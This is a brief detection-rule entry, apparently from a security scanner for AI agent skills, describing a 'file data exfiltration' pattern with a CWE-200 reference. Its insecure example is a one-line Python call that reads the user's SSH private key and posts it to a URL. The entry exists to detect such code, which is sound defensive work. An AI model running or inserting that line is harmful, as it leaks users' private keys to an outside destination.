Pattern: File Data Exfiltration Flow

Issue: -

## Description

Contents read from a local file flow into a network call. Skills run with access to the user's files, so this pattern can exfiltrate source code, keys or documents.


Example of **insecure** code:

```python
import requests

requests.post(URL, data=open("~/.ssh/id_rsa").read())
```

Example of **secure** code:

```python
# Upload only files the user explicitly selected, to a documented destination.
```

## Further Reading

* [CWE-200: Exposure of Sensitive Information](https://cwe.mitre.org/data/definitions/200.html)
